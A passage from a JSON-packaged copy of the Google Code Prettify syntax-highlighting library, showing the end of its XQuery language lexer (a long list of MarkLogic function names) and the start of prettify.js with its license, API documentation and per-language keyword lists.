operator and the tag closing char [PR['PR_PLAIN'], /^[\\s=][][\\s=]/], // Matching @Attributes [PR['PR_LITERAL'], /^\\@[\\w-]+/], // Matching xml tags [PR['PR_TAG'], /^$/i], // Matching single or multiline xquery comments -> (: :) [PR['PR_COMMENT'], /^\\(:[\\s\\S]*?:\\)/], // Tokenizing /{}:=;*,[]() as plain [PR['PR_PLAIN'], /^[\\/\\{\\};,\\[\\]\\(\\)]$/], // Matching a double or single quoted, possibly multi-line, string. // with the special condition that a { in a string changes to xquery context [PR['PR_STRING'], /^(?:\\\"(?:[^\\\"\\\\\\{]|\\\\[\\s\\S])*(?:\\\"|$)|\\'(?:[^\\'\\\\\\{]|\\\\[\\s\\S])*(?:\\'|$))/, null, '\"\\''], // Matching standard xquery keywords [PR['PR_KEYWORD'], /^(?:xquery|where|version|variable|union|typeswitch|treat|to|then|text|stable|sortby|some|self|schema|satisfies|returns|return|ref|processing-instruction|preceding-sibling|preceding|precedes|parent|only|of|node|namespace|module|let|item|intersect|instance|in|import|if|function|for|follows|following-sibling|following|external|except|every|else|element|descending|descendant-or-self|descendant|define|default|declare|comment|child|cast|case|before|attribute|assert|ascending|as|ancestor-or-self|ancestor|after|eq|order|by|or|and|schema-element|document-node|node|at)\\b/], // Matching standard xquery types [PR['PR_TYPE'], /^(?:xs:yearMonthDuration|xs:unsignedLong|xs:time|xs:string|xs:short|xs:QName|xs:Name|xs:long|xs:integer|xs:int|xs:gYearMonth|xs:gYear|xs:gMonthDay|xs:gDay|xs:float|xs:duration|xs:double|xs:decimal|xs:dayTimeDuration|xs:dateTime|xs:date|xs:byte|xs:boolean|xs:anyURI|xf:yearMonthDuration)\\b/, null], // Matching standard xquery functions [PR_FUNCTION, /^(?:xp:dereference|xinc:node-expand|xinc:link-references|xinc:link-expand|xhtml:restructure|xhtml:clean|xhtml:add-lists|xdmp:zip-manifest|xdmp:zip-get|xdmp:zip-create|xdmp:xquery-version|xdmp:word-convert|xdmp:with-namespaces|xdmp:version|xdmp:value|xdmp:user-roles|xdmp:user-last-login|xdmp:user|xdmp:url-encode|xdmp:url-decode|xdmp:uri-is-file|xdmp:uri-format|xdmp:uri-content-type|xdmp:unquote|xdmp:unpath|xdmp:triggers-database|xdmp:trace|xdmp:to-json|xdmp:tidy|xdmp:subbinary|xdmp:strftime|xdmp:spawn-in|xdmp:spawn|xdmp:sleep|xdmp:shutdown|xdmp:set-session-field|xdmp:set-response-encoding|xdmp:set-response-content-type|xdmp:set-response-code|xdmp:set-request-time-limit|xdmp:set|xdmp:servers|xdmp:server-status|xdmp:server-name|xdmp:server|xdmp:security-database|xdmp:security-assert|xdmp:schema-database|xdmp:save|xdmp:role-roles|xdmp:role|xdmp:rethrow|xdmp:restart|xdmp:request-timestamp|xdmp:request-status|xdmp:request-cancel|xdmp:request|xdmp:redirect-response|xdmp:random|xdmp:quote|xdmp:query-trace|xdmp:query-meters|xdmp:product-edition|xdmp:privilege-roles|xdmp:privilege|xdmp:pretty-print|xdmp:powerpoint-convert|xdmp:platform|xdmp:permission|xdmp:pdf-convert|xdmp:path|xdmp:octal-to-integer|xdmp:node-uri|xdmp:node-replace|xdmp:node-kind|xdmp:node-insert-child|xdmp:node-insert-before|xdmp:node-insert-after|xdmp:node-delete|xdmp:node-database|xdmp:mul64|xdmp:modules-root|xdmp:modules-database|xdmp:merging|xdmp:merge-cancel|xdmp:merge|xdmp:md5|xdmp:logout|xdmp:login|xdmp:log-level|xdmp:log|xdmp:lock-release|xdmp:lock-acquire|xdmp:load|xdmp:invoke-in|xdmp:invoke|xdmp:integer-to-octal|xdmp:integer-to-hex|xdmp:http-put|xdmp:http-post|xdmp:http-options|xdmp:http-head|xdmp:http-get|xdmp:http-delete|xdmp:hosts|xdmp:host-status|xdmp:host-name|xdmp:host|xdmp:hex-to-integer|xdmp:hash64|xdmp:hash32|xdmp:has-privilege|xdmp:groups|xdmp:group-serves|xdmp:group-servers|xdmp:group-name|xdmp:group-hosts|xdmp:group|xdmp:get-session-field-names|xdmp:get-session-field|xdmp:get-response-encoding|xdmp:get-response-code|xdmp:get-request-username|xdmp:get-request-user|xdmp:get-request-url|xdmp:get-request-protocol|xdmp:get-request-path|xdmp:get-request-method|xdmp:get-request-header-names|xdmp:get-request-header|xdmp:get-request-field-names|xdmp:get-request-field-filename|xdmp:get-request-field-content-type|xdmp:get-request-field|xdmp:get-request-client-certificate|xdmp:get-request-client-address|xdmp:get-request-body|xdmp:get-current-user|xdmp:get-current-roles|xdmp:get|xdmp:function-name|xdmp:function-module|xdmp:function|xdmp:from-json|xdmp:forests|xdmp:forest-status|xdmp:forest-restore|xdmp:forest-restart|xdmp:forest-name|xdmp:forest-delete|xdmp:forest-databases|xdmp:forest-counts|xdmp:forest-clear|xdmp:forest-backup|xdmp:forest|xdmp:filesystem-file|xdmp:filesystem-directory|xdmp:exists|xdmp:excel-convert|xdmp:eval-in|xdmp:eval|xdmp:estimate|xdmp:email|xdmp:element-content-type|xdmp:elapsed-time|xdmp:document-set-quality|xdmp:document-set-property|xdmp:document-set-properties|xdmp:document-set-permissions|xdmp:document-set-collections|xdmp:document-remove-properties|xdmp:document-remove-permissions|xdmp:document-remove-collections|xdmp:document-properties|xdmp:document-locks|xdmp:document-load|xdmp:document-insert|xdmp:document-get-quality|xdmp:document-get-properties|xdmp:document-get-permissions|xdmp:document-get-collections|xdmp:document-get|xdmp:document-forest|xdmp:document-delete|xdmp:document-add-properties|xdmp:document-add-permissions|xdmp:document-add-collections|xdmp:directory-properties|xdmp:directory-locks|xdmp:directory-delete|xdmp:directory-create|xdmp:directory|xdmp:diacritic-less|xdmp:describe|xdmp:default-permissions|xdmp:default-collections|xdmp:databases|xdmp:database-restore-validate|xdmp:database-restore-status|xdmp:database-restore-cancel|xdmp:database-restore|xdmp:database-name|xdmp:database-forests|xdmp:database-backup-validate|xdmp:database-backup-status|xdmp:database-backup-purge|xdmp:database-backup-cancel|xdmp:database-backup|xdmp:database|xdmp:collection-properties|xdmp:collection-locks|xdmp:collection-delete|xdmp:collation-canonical-uri|xdmp:castable-as|xdmp:can-grant-roles|xdmp:base64-encode|xdmp:base64-decode|xdmp:architecture|xdmp:apply|xdmp:amp-roles|xdmp:amp|xdmp:add64|xdmp:add-response-header|xdmp:access|trgr:trigger-set-recursive|trgr:trigger-set-permissions|trgr:trigger-set-name|trgr:trigger-set-module|trgr:trigger-set-event|trgr:trigger-set-description|trgr:trigger-remove-permissions|trgr:trigger-module|trgr:trigger-get-permissions|trgr:trigger-enable|trgr:trigger-disable|trgr:trigger-database-online-event|trgr:trigger-data-event|trgr:trigger-add-permissions|trgr:remove-trigger|trgr:property-content|trgr:pre-commit|trgr:post-commit|trgr:get-trigger-by-id|trgr:get-trigger|trgr:document-scope|trgr:document-content|trgr:directory-scope|trgr:create-trigger|trgr:collection-scope|trgr:any-property-content|thsr:set-entry|thsr:remove-term|thsr:remove-synonym|thsr:remove-entry|thsr:query-lookup|thsr:lookup|thsr:load|thsr:insert|thsr:expand|thsr:add-synonym|spell:suggest-detailed|spell:suggest|spell:remove-word|spell:make-dictionary|spell:load|spell:levenshtein-distance|spell:is-correct|spell:insert|spell:double-metaphone|spell:add-word|sec:users-collection|sec:user-set-roles|sec:user-set-password|sec:user-set-name|sec:user-set-description|sec:user-set-default-permissions|sec:user-set-default-collections|sec:user-remove-roles|sec:user-privileges|sec:user-get-roles|sec:user-get-description|sec:user-get-default-permissions|sec:user-get-default-collections|sec:user-doc-permissions|sec:user-doc-collections|sec:user-add-roles|sec:unprotect-collection|sec:uid-for-name|sec:set-realm|sec:security-version|sec:security-namespace|sec:security-installed|sec:security-collection|sec:roles-collection|sec:role-set-roles|sec:role-set-name|sec:role-set-description|sec:role-set-default-permissions|sec:role-set-default-collections|sec:role-remove-roles|sec:role-privileges|sec:role-get-roles|sec:role-get-description|sec:role-get-default-permissions|sec:role-get-default-collections|sec:role-doc-permissions|sec:role-doc-collections|sec:role-add-roles|sec:remove-user|sec:remove-role-from-users|sec:remove-role-from-role|sec:remove-role-from-privileges|sec:remove-role-from-amps|sec:remove-role|sec:remove-privilege|sec:remove-amp|sec:protect-collection|sec:privileges-collection|sec:privilege-set-roles|sec:privilege-set-name|sec:privilege-remove-roles|sec:privilege-get-roles|sec:privilege-add-roles|sec:priv-doc-permissions|sec:priv-doc-collections|sec:get-user-names|sec:get-unique-elem-id|sec:get-role-names|sec:get-role-ids|sec:get-privilege|sec:get-distinct-permissions|sec:get-collection|sec:get-amp|sec:create-user-with-role|sec:create-user|sec:create-role|sec:create-privilege|sec:create-amp|sec:collections-collection|sec:collection-set-permissions|sec:collection-remove-permissions|sec:collection-get-permissions|sec:collection-add-permissions|sec:check-admin|sec:amps-collection|sec:amp-set-roles|sec:amp-remove-roles|sec:amp-get-roles|sec:amp-doc-permissions|sec:amp-doc-collections|sec:amp-add-roles|search:unparse|search:suggest|search:snippet|search:search|search:resolve-nodes|search:resolve|search:remove-constraint|search:parse|search:get-default-options|search:estimate|search:check-options|prof:value|prof:reset|prof:report|prof:invoke|prof:eval|prof:enable|prof:disable|prof:allowed|ppt:clean|pki:template-set-request|pki:template-set-name|pki:template-set-key-type|pki:template-set-key-options|pki:template-set-description|pki:template-in-use|pki:template-get-version|pki:template-get-request|pki:template-get-name|pki:template-get-key-type|pki:template-get-key-options|pki:template-get-id|pki:template-get-description|pki:need-certificate|pki:is-temporary|pki:insert-trusted-certificates|pki:insert-template|pki:insert-signed-certificates|pki:insert-certificate-revocation-list|pki:get-trusted-certificate-ids|pki:get-template-ids|pki:get-template-certificate-authority|pki:get-template-by-name|pki:get-template|pki:get-pending-certificate-requests-xml|pki:get-pending-certificate-requests-pem|pki:get-pending-certificate-request|pki:get-certificates-for-template-xml|pki:get-certificates-for-template|pki:get-certificates|pki:get-certificate-xml|pki:get-certificate-pem|pki:get-certificate|pki:generate-temporary-certificate-if-necessary|pki:generate-temporary-certificate|pki:generate-template-certificate-authority|pki:generate-certificate-request|pki:delete-template|pki:delete-certificate|pki:create-template|pdf:make-toc|pdf:insert-toc-headers|pdf:get-toc|pdf:clean|p:status-transition|p:state-transition|p:remove|p:pipelines|p:insert|p:get-by-id|p:get|p:execute|p:create|p:condition|p:collection|p:action|ooxml:runs-merge|ooxml:package-uris|ooxml:package-parts-insert|ooxml:package-parts|msword:clean|mcgm:polygon|mcgm:point|mcgm:geospatial-query-from-elements|mcgm:geospatial-query|mcgm:circle|math:tanh|math:tan|math:sqrt|math:sinh|math:sin|math:pow|math:modf|math:log10|math:log|math:ldexp|math:frexp|math:fmod|math:floor|math:fabs|math:exp|math:cosh|math:cos|math:ceil|math:atan2|math:atan|math:asin|math:acos|map:put|map:map|map:keys|map:get|map:delete|map:count|map:clear|lnk:to|lnk:remove|lnk:insert|lnk:get|lnk:from|lnk:create|kml:polygon|kml:point|kml:interior-polygon|kml:geospatial-query-from-elements|kml:geospatial-query|kml:circle|kml:box|gml:polygon|gml:point|gml:interior-polygon|gml:geospatial-query-from-elements|gml:geospatial-query|gml:circle|gml:box|georss:point|georss:geospatial-query|georss:circle|geo:polygon|geo:point|geo:interior-polygon|geo:geospatial-query-from-elements|geo:geospatial-query|geo:circle|geo:box|fn:zero-or-one|fn:years-from-duration|fn:year-from-dateTime|fn:year-from-date|fn:upper-case|fn:unordered|fn:true|fn:translate|fn:trace|fn:tokenize|fn:timezone-from-time|fn:timezone-from-dateTime|fn:timezone-from-date|fn:sum|fn:subtract-dateTimes-yielding-yearMonthDuration|fn:subtract-dateTimes-yielding-dayTimeDuration|fn:substring-before|fn:substring-after|fn:substring|fn:subsequence|fn:string-to-codepoints|fn:string-pad|fn:string-length|fn:string-join|fn:string|fn:static-base-uri|fn:starts-with|fn:seconds-from-time|fn:seconds-from-duration|fn:seconds-from-dateTime|fn:round-half-to-even|fn:round|fn:root|fn:reverse|fn:resolve-uri|fn:resolve-QName|fn:replace|fn:remove|fn:QName|fn:prefix-from-QName|fn:position|fn:one-or-more|fn:number|fn:not|fn:normalize-unicode|fn:normalize-space|fn:node-name|fn:node-kind|fn:nilled|fn:namespace-uri-from-QName|fn:namespace-uri-for-prefix|fn:namespace-uri|fn:name|fn:months-from-duration|fn:month-from-dateTime|fn:month-from-date|fn:minutes-from-time|fn:minutes-from-duration|fn:minutes-from-dateTime|fn:min|fn:max|fn:matches|fn:lower-case|fn:local-name-from-QName|fn:local-name|fn:last|fn:lang|fn:iri-to-uri|fn:insert-before|fn:index-of|fn:in-scope-prefixes|fn:implicit-timezone|fn:idref|fn:id|fn:hours-from-time|fn:hours-from-duration|fn:hours-from-dateTime|fn:floor|fn:false|fn:expanded-QName|fn:exists|fn:exactly-one|fn:escape-uri|fn:escape-html-uri|fn:error|fn:ends-with|fn:encode-for-uri|fn:empty|fn:document-uri|fn:doc-available|fn:doc|fn:distinct-values|fn:distinct-nodes|fn:default-collation|fn:deep-equal|fn:days-from-duration|fn:day-from-dateTime|fn:day-from-date|fn:data|fn:current-time|fn:current-dateTime|fn:current-date|fn:count|fn:contains|fn:concat|fn:compare|fn:collection|fn:codepoints-to-string|fn:codepoint-equal|fn:ceiling|fn:boolean|fn:base-uri|fn:avg|fn:adjust-time-to-timezone|fn:adjust-dateTime-to-timezone|fn:adjust-date-to-timezone|fn:abs|feed:unsubscribe|feed:subscription|feed:subscribe|feed:request|feed:item|feed:description|excel:clean|entity:enrich|dom:set-pipelines|dom:set-permissions|dom:set-name|dom:set-evaluation-context|dom:set-domain-scope|dom:set-description|dom:remove-pipeline|dom:remove-permissions|dom:remove|dom:get|dom:evaluation-context|dom:domains|dom:domain-scope|dom:create|dom:configuration-set-restart-user|dom:configuration-set-permissions|dom:configuration-set-evaluation-context|dom:configuration-set-default-domain|dom:configuration-get|dom:configuration-create|dom:collection|dom:add-pipeline|dom:add-permissions|dls:retention-rules|dls:retention-rule-remove|dls:retention-rule-insert|dls:retention-rule|dls:purge|dls:node-expand|dls:link-references|dls:link-expand|dls:documents-query|dls:document-versions-query|dls:document-version-uri|dls:document-version-query|dls:document-version-delete|dls:document-version-as-of|dls:document-version|dls:document-update|dls:document-unmanage|dls:document-set-quality|dls:document-set-property|dls:document-set-properties|dls:document-set-permissions|dls:document-set-collections|dls:document-retention-rules|dls:document-remove-properties|dls:document-remove-permissions|dls:document-remove-collections|dls:document-purge|dls:document-manage|dls:document-is-managed|dls:document-insert-and-manage|dls:document-include-query|dls:document-history|dls:document-get-permissions|dls:document-extract-part|dls:document-delete|dls:document-checkout-status|dls:document-checkout|dls:document-checkin|dls:document-add-properties|dls:document-add-permissions|dls:document-add-collections|dls:break-checkout|dls:author-query|dls:as-of-query|dbk:convert|dbg:wait|dbg:value|dbg:stopped|dbg:stop|dbg:step|dbg:status|dbg:stack|dbg:out|dbg:next|dbg:line|dbg:invoke|dbg:function|dbg:finish|dbg:expr|dbg:eval|dbg:disconnect|dbg:detach|dbg:continue|dbg:connect|dbg:clear|dbg:breakpoints|dbg:break|dbg:attached|dbg:attach|cvt:save-converted-documents|cvt:part-uri|cvt:destination-uri|cvt:basepath|cvt:basename|cts:words|cts:word-query-weight|cts:word-query-text|cts:word-query-options|cts:word-query|cts:word-match|cts:walk|cts:uris|cts:uri-match|cts:train|cts:tokenize|cts:thresholds|cts:stem|cts:similar-query-weight|cts:similar-query-nodes|cts:similar-query|cts:shortest-distance|cts:search|cts:score|cts:reverse-query-weight|cts:reverse-query-nodes|cts:reverse-query|cts:remainder|cts:registered-query-weight|cts:registered-query-options|cts:registered-query-ids|cts:registered-query|cts:register|cts:query|cts:quality|cts:properties-query-query|cts:properties-query|cts:polygon-vertices|cts:polygon|cts:point-longitude|cts:point-latitude|cts:point|cts:or-query-queries|cts:or-query|cts:not-query-weight|cts:not-query-query|cts:not-query|cts:near-query-weight|cts:near-query-queries|cts:near-query-options|cts:near-query-distance|cts:near-query|cts:highlight|cts:geospatial-co-occurrences|cts:frequency|cts:fitness|cts:field-words|cts:field-word-query-weight|cts:field-word-query-text|cts:field-word-query-options|cts:field-word-query-field-name|cts:field-word-query|cts:field-word-match|cts:entity-highlight|cts:element-words|cts:element-word-query-weight|cts:element-word-query-text|cts:element-word-query-options|cts:element-word-query-element-name|cts:element-word-query|cts:element-word-match|cts:element-values|cts:element-value-ranges|cts:element-value-query-weight|cts:element-value-query-text|cts:element-value-query-options|cts:element-value-query-element-name|cts:element-value-query|cts:element-value-match|cts:element-value-geospatial-co-occurrences|cts:element-value-co-occurrences|cts:element-range-query-weight|cts:element-range-query-value|cts:element-range-query-options|cts:element-range-query-operator|cts:element-range-query-element-name|cts:element-range-query|cts:element-query-query|cts:element-query-element-name|cts:element-query|cts:element-pair-geospatial-values|cts:element-pair-geospatial-value-match|cts:element-pair-geospatial-query-weight|cts:element-pair-geospatial-query-region|cts:element-pair-geospatial-query-options|cts:element-pair-geospatial-query-longitude-name|cts:element-pair-geospatial-query-latitude-name|cts:element-pair-geospatial-query-element-name|cts:element-pair-geospatial-query|cts:element-pair-geospatial-boxes|cts:element-geospatial-values|cts:element-geospatial-value-match|cts:element-geospatial-query-weight|cts:element-geospatial-query-region|cts:element-geospatial-query-options|cts:element-geospatial-query-element-name|cts:element-geospatial-query|cts:element-geospatial-boxes|cts:element-child-geospatial-values|cts:element-child-geospatial-value-match|cts:element-child-geospatial-query-weight|cts:element-child-geospatial-query-region|cts:element-child-geospatial-query-options|cts:element-child-geospatial-query-element-name|cts:element-child-geospatial-query-child-name|cts:element-child-geospatial-query|cts:element-child-geospatial-boxes|cts:element-attribute-words|cts:element-attribute-word-query-weight|cts:element-attribute-word-query-text|cts:element-attribute-word-query-options|cts:element-attribute-word-query-element-name|cts:element-attribute-word-query-attribute-name|cts:element-attribute-word-query|cts:element-attribute-word-match|cts:element-attribute-values|cts:element-attribute-value-ranges|cts:element-attribute-value-query-weight|cts:element-attribute-value-query-text|cts:element-attribute-value-query-options|cts:element-attribute-value-query-element-name|cts:element-attribute-value-query-attribute-name|cts:element-attribute-value-query|cts:element-attribute-value-match|cts:element-attribute-value-geospatial-co-occurrences|cts:element-attribute-value-co-occurrences|cts:element-attribute-range-query-weight|cts:element-attribute-range-query-value|cts:element-attribute-range-query-options|cts:element-attribute-range-query-operator|cts:element-attribute-range-query-element-name|cts:element-attribute-range-query-attribute-name|cts:element-attribute-range-query|cts:element-attribute-pair-geospatial-values|cts:element-attribute-pair-geospatial-value-match|cts:element-attribute-pair-geospatial-query-weight|cts:element-attribute-pair-geospatial-query-region|cts:element-attribute-pair-geospatial-query-options|cts:element-attribute-pair-geospatial-query-longitude-name|cts:element-attribute-pair-geospatial-query-latitude-name|cts:element-attribute-pair-geospatial-query-element-name|cts:element-attribute-pair-geospatial-query|cts:element-attribute-pair-geospatial-boxes|cts:document-query-uris|cts:document-query|cts:distance|cts:directory-query-uris|cts:directory-query-depth|cts:directory-query|cts:destination|cts:deregister|cts:contains|cts:confidence|cts:collections|cts:collection-query-uris|cts:collection-query|cts:collection-match|cts:classify|cts:circle-radius|cts:circle-center|cts:circle|cts:box-west|cts:box-south|cts:box-north|cts:box-east|cts:box|cts:bearing|cts:arc-intersection|cts:and-query-queries|cts:and-query-options|cts:and-query|cts:and-not-query-positive-query|cts:and-not-query-negative-query|cts:and-not-query|css:get|css:convert|cpf:success|cpf:failure|cpf:document-set-state|cpf:document-set-processing-status|cpf:document-set-last-updated|cpf:document-set-error|cpf:document-get-state|cpf:document-get-processing-status|cpf:document-get-last-updated|cpf:document-get-error|cpf:check-transition|alert:spawn-matching-actions|alert:rule-user-id-query|alert:rule-set-user-id|alert:rule-set-query|alert:rule-set-options|alert:rule-set-name|alert:rule-set-description|alert:rule-set-action|alert:rule-remove|alert:rule-name-query|alert:rule-insert|alert:rule-id-query|alert:rule-get-user-id|alert:rule-get-query|alert:rule-get-options|alert:rule-get-name|alert:rule-get-id|alert:rule-get-description|alert:rule-get-action|alert:rule-action-query|alert:remove-triggers|alert:make-rule|alert:make-log-action|alert:make-config|alert:make-action|alert:invoke-matching-actions|alert:get-my-rules|alert:get-all-rules|alert:get-actions|alert:find-matching-rules|alert:create-triggers|alert:config-set-uri|alert:config-set-trigger-ids|alert:config-set-options|alert:config-set-name|alert:config-set-description|alert:config-set-cpf-domain-names|alert:config-set-cpf-domain-ids|alert:config-insert|alert:config-get-uri|alert:config-get-trigger-ids|alert:config-get-options|alert:config-get-name|alert:config-get-id|alert:config-get-description|alert:config-get-cpf-domain-names|alert:config-get-cpf-domain-ids|alert:config-get|alert:config-delete|alert:action-set-options|alert:action-set-name|alert:action-set-module-root|alert:action-set-module-db|alert:action-set-module|alert:action-set-description|alert:action-remove|alert:action-insert|alert:action-get-options|alert:action-get-name|alert:action-get-module-root|alert:action-get-module-db|alert:action-get-module|alert:action-get-description|zero-or-one|years-from-duration|year-from-dateTime|year-from-date|upper-case|unordered|true|translate|trace|tokenize|timezone-from-time|timezone-from-dateTime|timezone-from-date|sum|subtract-dateTimes-yielding-yearMonthDuration|subtract-dateTimes-yielding-dayTimeDuration|substring-before|substring-after|substring|subsequence|string-to-codepoints|string-pad|string-length|string-join|string|static-base-uri|starts-with|seconds-from-time|seconds-from-duration|seconds-from-dateTime|round-half-to-even|round|root|reverse|resolve-uri|resolve-QName|replace|remove|QName|prefix-from-QName|position|one-or-more|number|not|normalize-unicode|normalize-space|node-name|node-kind|nilled|namespace-uri-from-QName|namespace-uri-for-prefix|namespace-uri|name|months-from-duration|month-from-dateTime|month-from-date|minutes-from-time|minutes-from-duration|minutes-from-dateTime|min|max|matches|lower-case|local-name-from-QName|local-name|last|lang|iri-to-uri|insert-before|index-of|in-scope-prefixes|implicit-timezone|idref|id|hours-from-time|hours-from-duration|hours-from-dateTime|floor|false|expanded-QName|exists|exactly-one|escape-uri|escape-html-uri|error|ends-with|encode-for-uri|empty|document-uri|doc-available|doc|distinct-values|distinct-nodes|default-collation|deep-equal|days-from-duration|day-from-dateTime|day-from-date|data|current-time|current-dateTime|current-date|count|contains|concat|compare|collection|codepoints-to-string|codepoint-equal|ceiling|boolean|base-uri|avg|adjust-time-to-timezone|adjust-dateTime-to-timezone|adjust-date-to-timezone|abs)\\b/], // Matching normal words if none of the previous regular expressions matched [PR['PR_PLAIN'], /^[A-Za-z0-9_\\-\\:]+/], // Matching whitespaces [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/] ]), ['xq', 'xquery']); })();","path":"plugins/prettify/lang-xq.js"},{"title":"","text":"/** * @license * Copyright (C) 2006 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * some functions for browser-side pretty printing of code contained in html. * * * For a fairly comprehensive set of languages see the * README * file that came with this source. At a minimum, the lexer should work on a * number of languages including C and friends, Java, Python, Bash, SQL, HTML, * XML, CSS, Javascript, and Makefiles. It works passably on Ruby, PHP and Awk * and a subset of Perl, but, because of commenting conventions, doesn't work on * Smalltalk, Lisp-like, or CAML-like languages without an explicit lang class. * * Usage: * include this source file in an html page via * {@code } * define style rules. See the example page for examples. * mark the {@code } and {@code } tags in your source with * {@code class=prettyprint.} * You can also use the (html deprecated) {@code } tag, but the pretty * printer needs to do more substantial DOM manipulations to support that, so * some css styles may not be preserved. * * That's it. I wanted to keep the API as simple as possible, so there's no * need to specify which language the code is in, but if you wish, you can add * another class to the {@code } or {@code } element to specify the * language, as in {@code }. Any class that * starts with \"lang-\" followed by a file extension, specifies the file type. * See the \"lang-*.js\" files in this directory for code that implements * per-language file handlers. * * Change log: * cbeust, 2006/08/22 * * Java annotations (start with \"@\") are now captured as literals (\"lit\") * * @requires console */ // JSLint declarations /*global console, document, navigator, setTimeout, window, define */ /** * @typedef {!Array.} * Alternating indices and the decorations that should be inserted there. * The indices are monotonically increasing. */ var DecorationsT; /** * @typedef {!{ * sourceNode: !Element, * pre: !(number|boolean), * langExtension: ?string, * numberLines: ?(number|boolean), * sourceCode: ?string, * spans: ?(Array.), * basePos: ?number, * decorations: ?DecorationsT * }} * * sourceNodethe element containing the source * sourceCodesource as plain text * pretruthy if white-space in text nodes * should be considered significant. * spans alternating span start indices into source * and the text node or element (e.g. {@code }) corresponding to that * span. * decorationsan array of style classes preceded * by the position at which they start in job.sourceCode in order * basePosinteger position of this.sourceCode in the larger chunk of * source. * */ var JobT; /** * @typedef {!{ * sourceCode: string, * spans: !(Array.) * }} * * sourceCodesource as plain text * spans alternating span start indices into source * and the text node or element (e.g. {@code }) corresponding to that * span. * */ var SourceSpansT; /** @define {boolean} */ var IN_GLOBAL_SCOPE = true; /** * {@type !{ * 'createSimpleLexer': function (Array, Array): (function (JobT)), * 'registerLangHandler': function (function (JobT), Array.), * 'PR_ATTRIB_NAME': string, * 'PR_ATTRIB_NAME': string, * 'PR_ATTRIB_VALUE': string, * 'PR_COMMENT': string, * 'PR_DECLARATION': string, * 'PR_KEYWORD': string, * 'PR_LITERAL': string, * 'PR_NOCODE': string, * 'PR_PLAIN': string, * 'PR_PUNCTUATION': string, * 'PR_SOURCE': string, * 'PR_STRING': string, * 'PR_TAG': string, * 'PR_TYPE': string, * 'prettyPrintOne': function (string, string, number|boolean), * 'prettyPrint': function (?function, ?(HTMLElement|HTMLDocument)) * }} * @const */ var PR; /** * Split {@code prettyPrint} into multiple timeouts so as not to interfere with * UI events. * If set to {@code false}, {@code prettyPrint()} is synchronous. */ var PR_SHOULD_USE_CONTINUATION = true if (typeof window !== 'undefined') { window['PR_SHOULD_USE_CONTINUATION'] = PR_SHOULD_USE_CONTINUATION; } /** * Pretty print a chunk of code. * @param {string} sourceCodeHtml The HTML to pretty print. * @param {string} opt_langExtension The language name to use. * Typically, a filename extension like 'cpp' or 'java'. * @param {number|boolean} opt_numberLines True to number lines, * or the 1-indexed number of the first line in sourceCodeHtml. * @return {string} code as html, but prettier */ var prettyPrintOne; /** * Find all the {@code } and {@code } tags in the DOM with * {@code class=prettyprint} and prettify them. * * @param {Function} opt_whenDone called when prettifying is done. * @param {HTMLElement|HTMLDocument} opt_root an element or document * containing all the elements to pretty print. * Defaults to {@code document.body}. */ var prettyPrint; (function () { var win = (typeof window !== 'undefined') ? window : {}; // Keyword lists for various languages. // We use things that coerce to strings to make them compact when minified // and to defeat aggressive optimizers that fold large string constants. var FLOW_CONTROL_KEYWORDS = [\"break,continue,do,else,for,if,return,while\"]; var C_KEYWORDS = [FLOW_CONTROL_KEYWORDS,\"auto,case,char,const,default,\" + \"double,enum,extern,float,goto,inline,int,long,register,restrict,short,signed,\" + \"sizeof,static,struct,switch,typedef,union,unsigned,void,volatile\"]; var COMMON_KEYWORDS = [C_KEYWORDS,\"catch,class,delete,false,import,\" + \"new,operator,private,protected,public,this,throw,true,try,typeof\"]; var CPP_KEYWORDS = [COMMON_KEYWORDS,\"alignas,alignof,align_union,asm,axiom,bool,\" + \"concept,concept_map,const_cast,constexpr,decltype,delegate,\" + \"dynamic_cast,explicit,export,friend,generic,late_check,\" + \"mutable,namespace,noexcept,noreturn,nullptr,property,reinterpret_cast,static_assert,\" + \"static_cast,template,typeid,typename,using,virtual,where\"]; var JAVA_KEYWORDS = [COMMON_KEYWORDS, \"abstract,assert,boolean,byte,extends,finally,final,implements,import,\" + \"instanceof,interface,null,native,package,strictfp,super,synchronized,\" + \"throws,transient\"]; var CSHARP_KEYWORDS = [COMMON_KEYWORDS, \"abstract,add,alias,as,ascending,async,await,base,bool,by,byte,checked,decimal,delegate,descending,\" + \"dynamic,event,finally,fixed,foreach,from,get,global,group,implicit,in,interface,\" + \"internal,into,is,join,let,lock,null,object,out,override,orderby,params,\" + \"partial,readonly,ref,remove,sbyte,sealed,select,set,stackalloc,string,select,uint,ulong,\" + \"unchecked,unsafe,ushort,value,var,virtual,where,yield\"]; var COFFEE_KEYWORDS = \"all,and,by,catch,class,else,extends,false,finally,\" + \"for,if,in,is,isnt,loop,new,no,not,null,of,off,on,or,return,super,then,\" + \"throw,true,try,unless,until,when,while,yes\"; var JSCRIPT_KEYWORDS = [COMMON_KEYWORDS, \"abstract,async,await,constructor,debugger,enum,eval,export,from,function,\" + \"get,import,implements,instanceof,interface,let,null,of,set,undefined,\" + \"var,with,yield,Infinity,NaN\"]; var PERL_KEYWORDS = \"caller,delete,die,do,dump,elsif,eval,exit,foreach,for,\" + \"goto,if,import,last,local,my,next,no,our,print,package,redo,require,\" + \"sub,undef,unless,until,use,wantarray,while,BEGIN,END\"; var PYTHON_KEYWORDS = [FLOW_CONTROL_KEYWORDS, \"and,as,assert,class,def,del,\" + \"elif,except,exec,finally,from,global,import,in,is,lambda,\" + \"nonlocal,not,or,pass,print,raise,try,with,yield,\" + \"False,True,None\"]; var RUBY_KEYWORDS = [FLOW_CONTROL_KEYWORDS, \"alias,and,begin,case,class,\" + \"def,defined,elsif,end,ensure,false,in,module,next,nil,not,or,redo,\" + \"rescue,retry,self,super,then,true,undef,unless,until,when,yield,\" + \"BEGIN,END\"]; var SH_KEYWORDS = [FLOW_CONTROL_KEYWORDS, \"case,done,elif,esac,eval,fi,\" + \"function,in,local,set,then,until\"]; var ALL_KEYWORDS = [ CPP_KEYWORDS, CSHARP_KEYWORDS, JAVA_KEYWORDS, JSCRIPT_KEYWORDS, PERL_KEYWORDS, PYTHON_KEYWORDS, RUBY_KEYWORDS, SH_KEYWORDS]; var C_TYPES = 